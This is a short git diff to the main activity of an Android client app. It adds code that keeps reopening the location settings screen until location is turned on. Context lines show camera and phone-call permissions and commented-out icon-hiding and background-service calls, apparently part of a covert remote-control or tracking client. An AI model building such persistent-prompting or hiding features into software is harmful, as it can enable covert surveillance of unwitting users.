@@ -1,14 +1,17 @@
 package com.ot.grhq.client;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 
 import android.Manifest;
+import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.location.LocationManager;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
@@ -37,6 +40,14 @@ import java.util.List;
 public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 200;
 
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (resultCode != Activity.RESULT_OK) {
+            enableLocationServices();
+        }
+    }
+
     private static String[] PERMISSIONS = {
             Manifest.permission.CAMERA,
             Manifest.permission.CALL_PHONE,
@@ -64,11 +75,13 @@ public class MainActivity extends AppCompatActivity {
 
         checkPermissions();
 
+
         if (isFirstTime()) {
             try {
                 setClientID();
             } catch (JSONException e) {}
         }
+        enableLocationServices();
 
 //        hideApplicationIcon();
 //        startService(new Intent(this, MainService.class));
@@ -109,6 +122,17 @@ public class MainActivity extends AppCompatActivity {
         if (!permissionsToRequest.isEmpty() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
             requestPermissions(permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
 
+    }
+
+
+    private void enableLocationServices() {
+        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        boolean isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
+        boolean isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
+        if (!isGpsEnabled && !isNetworkEnabled){
+            Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
+            startActivityForResult(intent, PERMISSION_REQUEST_CODE);
+        }
     }
 
     public static boolean hasOverlayPermission(Context context) {
